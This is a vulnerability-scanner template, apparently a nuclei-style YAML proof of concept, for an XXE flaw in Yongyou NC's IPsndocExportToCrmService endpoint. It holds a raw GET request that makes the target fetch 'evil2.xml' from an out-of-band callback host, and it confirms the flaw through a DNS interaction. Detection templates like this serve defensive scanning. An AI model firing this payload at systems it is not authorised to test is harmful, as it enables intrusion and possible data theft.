id: poc-yaml-yongyou-ipsndocexporttocrmservice-xxe
info:
  name: Yongyou NC IPsndocExportToCrmService XXE Vulnerability
  author: ProjectDiscoveryAI
  severity: high
  tags: dnslog,xxe
http:
  - raw:
      - |
        GET /uapws/service/nc.itf.bd.crm.IPsndocExportToCrmService?xsd=http://{{interactsh-url}}/evil2.xml HTTP/1.1
        Host: {{Hostname}}
    matchers:
      - type: word
        part: interactsh_protocol
        words:
          - "dns"
